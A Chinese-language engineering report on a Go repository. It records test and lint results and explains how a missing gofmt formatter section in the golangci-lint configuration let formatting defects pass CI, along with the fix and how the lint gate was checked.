> 要么在装配期炸掉，要么把不变量做成结构性的 —— 不留「已知限制」。

### 收口后的验证（本机实跑，全部通过）

| 项 | 结果 |
|---|---|
| `go build ./...` / `go vet ./...` | 干净 |
| `go test ./...` | **26 个包全 ok**，0 FAIL |
| `golangci-lint v2.6.1 --config .golangci.yml` | **`0 issues`**（CI 同版本，含 QF 类检查） |
| `e2e/e2e.sh` | **PASS=21 FAIL=0** |
| `e2e/security.sh` | **PASS=32 FAIL=0** |
| `e2e/ui_smoke.sh` | **PASS=11 FAIL=0** |
| `gofmt -l .` | 干净（首轮跑时曾报 5 个文件 —— 见下条 #30） |

### 再补一件：格式一致性零门禁（`Specs/06` #30）

上面那行 `gofmt` 的备注本身就是一条线索 —— 追下去发现「本机有 5 个文件不合 gofmt、
CI 全绿」的原因是 **`.golangci.yml` 里没有 `formatters` 段**。golangci-lint v2 把
gofmt/goimports 移到了顶层 `formatters`，**不在 `linters` 下**，不显式声明就完全不跑。

5 个文件是三种性质，处置不同：

| 类别 | 文件 | 性质 |
|---|---|---|
| **A. 真实格式缺陷** | `pkg/global/global_test.go`（4 处） | `for … {` 与 `t.Run(…)` 之间被一个**字面 TAB** 粘在同一行 |
| B. 文件尾缺换行 | `debug/hub.go`、`pkg/global/global.go` | 卫生 |
| C. Go 1.19 前的 doc-comment 排版 | `debug/handler.go`、`debug/store.go` | 工具链年代差异，非作者失误 |

A 类追到 `c35dbe8`（2026-09-12）—— 一个标题为**「chore(lint): 引入 golangci-lint
保守规则集并清零全部 11+8 处告警」**的提交，在删 `tc := tc` 冗余拷贝时弄丢了换行，
同一提交还写着「本地 golangci-lint v2 复跑：0 issues」。**那句话是真的**，
因为配置里没有格式检查。残渣存活 **11 天 / 跨 4 个提交 / 每轮 CI 全绿**。

修法：全仓 `gofmt -w`（48 行是 C 类注释重排，零语义）+ `.golangci.yml` 加
`formatters: enable: [gofmt]` + 同步 CI 里那条「逐条枚举规则集」的注释。

> **门禁类改动必须做「注入违规 → 确认被拦 → 还原」的对照组。**
> 第一次实验给出的是 `0 issues` —— **假绿**。追下去有两层原因：先是缓存（换冷缓存
> 才看见文件被 `unused` 报出来），再是 **`issues.uniq-by-line`（默认 true）按行去重**
> （`unused` 在 4:6、`gofmt` 在 4:1，同一行只留一条）。把函数改成导出名消掉 `unused`
> 后，`gofmt` 立刻报出来，机制才算钉死。
> 若就此收工，交付的会是一个「看着配好了、实际不报」的门禁 —— 即又一个 #26。
> **`uniq-by-line` 保持默认**：它是可用性差异不是盲区（文件照样进不了门禁），
> 这条实测定论已写进 `.golangci.yml` 注释。

**这一条与 #26 / #29 是同一族**，只是前两次是「配置项没人读」，这次是
「文件属性没人看」——共同形状都是**没有读取方 / 没有门禁的约束，等于不存在**。

